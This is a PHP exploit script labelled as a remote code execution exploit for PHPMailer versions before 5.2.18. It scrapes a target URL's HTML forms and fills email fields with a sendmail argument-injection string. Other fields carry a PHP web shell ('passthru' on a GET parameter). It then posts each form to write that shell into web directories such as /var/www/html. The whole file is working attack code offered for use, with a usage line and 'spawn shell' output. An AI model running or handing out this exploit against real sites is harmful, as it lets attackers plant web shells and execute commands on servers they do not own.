<?php
/*
         ,--.  ,--.                             ,--.  
 ,---. ,-'  '-.|  ,---. ,--.--. ,---.  ,--,--.,-'  '-.
| .-. |'-.  .-'|  .-.  ||  .--'| .-. :' ,-.  |'-.  .-'
| '-' '  |  |  |  | |  ||  |   \   --.\ '-'  |  |  |  
|  |-'   `--'  `--' `--'`--'    `----' `--`--'  `--'  
`--'                                                  

PHPMAILER < 5.2.18 Remote execution exploit

*/

	error_reporting(E_ALL);
	ini_set('display_errors','On');

	function printUsage(){

		echo "Usage: ".__FILE__." targetUrl [directory1,directory2,directory3 ...]\n";

	}

	function post($url,Array $vars){

		$opts			=	Array(
									'http' => Array(
														'method'  =>	'POST',
														'header'  =>	'Content-type: application/x-www-form-urlencoded',
														'content' =>	http_build_query($vars)
							)
		);

		return file_get_contents($url, false, stream_context_create($opts));

	}

	function createPayload($directory, $payLoad=NULL){

		if($payLoad === NULL){

			$payLoad	=	'"pthreat\\\" -OQueueDirectory=/tmp -X%s/p.php server\" @protonmail.com';

		}

		return sprintf($payLoad,$directory);

	}

	function findForms($url=NULL,$payLoad=NULL){

		if(empty($payLoad)){

			$payLoad		=	'<?php passthru($_GET[\"c\"]);?>';

		}

		$url	=	trim($url);

		if(empty($url)){

			throw new \InvalidArgumentException("Invalid URL provided");

		}

		libxml_use_internal_errors(true);

		$dom		=	new \DomDocument();
		$dom->loadHTML(file_get_contents($url));
		$forms	=	$dom->getElementsByTagName('form');

		libxml_clear_errors();

		if($forms->length==0){

			throw new \RuntimeException("No forms found in $url");

		}

		$retForms	=	Array();

		foreach($forms as $f){

			$action		=	trim($f->getAttribute('action'));
			$newUrl		=	empty($action) ? $url : sprintf('%s/%s',substr($url,0,strrpos($url,'/')),$action);

			$method		=	strtolower(trim($f->getAttribute('method')));
			$method		=	empty($method) ? 'GET' : 'POST';

			$elements	=	Array();
			
			$elements['input']		=	$f->getElementsByTagName('input');
			$elements['select']		=	$f->getElementsByTagName('select');
			$elements['textarea']	=	$f->getElementsByTagName('textarea');

			$postVars	=	Array();

			$injected	=	FALSE;

			foreach($elements as $type=>$list){

				foreach($list as $element){

					if($type=='select'){

						$options = $element->getElementsByTagName('option');
						$value = $options->item(1);

					}

					$name					=	$element->getAttribute('name');
					$type					=	$element->getAttribute('type');

					$postVars[]	=	Array(
												'name'	=>	$name,
												'value'	=>	$injected ? str_repeat('a',10) : $payLoad,
												'type'	=>	$type
					);

					$injected	=	TRUE;

				}

			}

			$retForms[] =	Array(
										'action'=>$newUrl,
										'method'=>$method,
										'fields'=>$postVars
			);

		}

		return $retForms;

	}

	if(!isset($_SERVER['argv'][1])){

		die(printUsage());

	}

	$url		=	$_SERVER['argv'][1];

	$directories	=	Array('/var/www/html');

	if(isset($_SERVER['argv'][2])){

		$directories	=	explode(',',$_SERVER['argv'][2]);

	}

	$forms	=	findForms($url);

	$cForms	=	sizeof($forms);

	echo sprintf("Found %s forms\n",$cForms);

	if(!sizeof($cForms)){

		die();

	}

	foreach(findForms($url) as $form=>&$f){

		foreach($directories as $dir){

			foreach($f['fields'] as &$var){

				$haveToAddPayload	=	trim(strtolower($var['type'])) == 'email' || preg_match('/mail/i',$var['name']);

				if(!$haveToAddPayload){

					continue;	
				
				}

				$var['value'] = createPayload($dir);

			}

			$sendVars	=	Array();

			array_map(
						function($v) use (&$sendVars){

							$sendVars[$v['name']] = $v['value'];

						},
						$f['fields']
			);

			echo "Trying to spawn shell on directory $dir ...\n";

			echo sprintf("\nPOST ... %s?%s\n",$f['action'],http_build_query($sendVars));

			var_dump(post($f['action'],$sendVars));

		}

	}
	

